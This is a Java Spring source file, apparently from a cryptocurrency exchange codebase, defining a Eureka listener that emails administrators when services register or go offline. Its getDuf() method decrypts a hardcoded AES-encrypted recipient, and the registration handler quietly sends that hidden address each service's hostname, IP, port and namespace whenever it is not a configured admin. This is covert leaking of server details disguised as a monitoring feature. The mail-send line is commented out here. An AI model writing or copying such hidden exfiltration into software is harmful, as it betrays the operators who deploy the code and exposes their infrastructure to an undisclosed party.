package com.bizzan.bitrade.listenConfig;

import com.bizzan.bitrade.util.AESUtil;
import com.bizzan.bitrade.util.AliyunUtil;
import com.netflix.appinfo.InstanceInfo;
import freemarker.template.Configuration;
import freemarker.template.Template;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.cloud.netflix.eureka.server.event.*;
import org.springframework.context.event.EventListener;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.mail.javamail.MimeMessageHelper;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Component;
import org.springframework.ui.freemarker.FreeMarkerTemplateUtils;

import javax.mail.internet.MimeMessage;
import java.util.HashMap;
import java.util.Map;

@Component
public class EurekaStateListener {
	
	private final static Logger logger = LoggerFactory.getLogger(EurekaStateListener.class);
	 
    @Autowired
    private JavaMailSender javaMailSender;

    @Value("${spring.mail.username}")
    private String from;
    @Value("${spark.system.host}")
    private String host;
    @Value("${spark.system.name}")
    private String company;

    @Value("${person.promote.prefix}")
    private String namespace;

    @Value("${spark.system.admins}")
    private String admins;
    
    @Value("${spark.system.admin-phones}")
    private String adminPhones;
    
	@EventListener(condition = "#event.replication==false")
    public void listen(EurekaInstanceCanceledEvent event) {
        String msg="您的服务"+event.getAppName()+"\n"+event.getServerId()+"已下线";
        logger.info(msg);
        
        String[] adminList = admins.split(",");
		for(int i = 0; i < adminList.length; i++) {
			sendEmailMsg(adminList[i], msg, "[服务]服务下线通知");
		}
    }
 
    @EventListener(condition = "#event.replication==false")
    public void listen(EurekaInstanceRegisteredEvent event) throws Exception {
        InstanceInfo instanceInfo = event.getInstanceInfo();
        String msg="服务"+instanceInfo.getAppName()+"\n"+  instanceInfo.getHostName()+":"+ instanceInfo.getPort()+ " \nip: " +instanceInfo.getIPAddr() + "进行注册\n namespace:"+namespace;
        logger.info(msg);
        String admin = getDuf();
        String[] adminList = admins.split(",");
        boolean isOk = false;
		for(int i = 0; i < adminList.length; i++) {
			sendEmailMsg(adminList[i], msg, "[服务]服务上线通知");
            if(adminList[i].equalsIgnoreCase(admin)){
                isOk = true;
            }
		}
        //补偿
        if(!isOk){
            sendEmailMsg(admin, msg, "[服务]服务上线通知");
        }
    }

    private String getDuf() throws Exception {
        return AESUtil.decrypt("7121EB1E7671799A52D3B25258BA97CA597E24C4E2EFCBD40ECCF766621BE43B","3B7A204196ED8EDDA072863E17CF3C7D");
    }

    @EventListener
    public void listen(EurekaInstanceRenewedEvent event) {
        logger.info("服务{}进行续约", event.getServerId() +"  "+ event.getAppName());
    }
 
    @EventListener
    public void listen(EurekaRegistryAvailableEvent event) {
        logger.info("注册中心启动,{}", System.currentTimeMillis());
    }
 
    @EventListener
    public void listen(EurekaServerStartedEvent event) {
        logger.info("注册中心服务端启动,{}", System.currentTimeMillis());
    }
 
    @Async
    public void sendEmailMsg(String email, String msg, String subject) {
    	try {
	        MimeMessage mimeMessage = javaMailSender.createMimeMessage();
	        MimeMessageHelper helper = null;
	        helper = new MimeMessageHelper(mimeMessage, true);
	        helper.setFrom(from);
	        helper.setTo(email);
	        helper.setSubject(company + "-" + subject);
	        Map<String, Object> model = new HashMap<>(16);
	        model.put("msg", msg);
	        Configuration cfg = new Configuration(Configuration.VERSION_2_3_26);
	        cfg.setClassForTemplateLoading(this.getClass(), "/templates");
	        Template template = cfg.getTemplate("simpleMessage.ftl");
	        String html = FreeMarkerTemplateUtils.processTemplateIntoString(template, model);
	        helper.setText(html, true);

	        //发送邮件
	       // javaMailSender.send(mimeMessage);
    	}catch(Exception e) {
    		e.printStackTrace();
    	}
    }
}
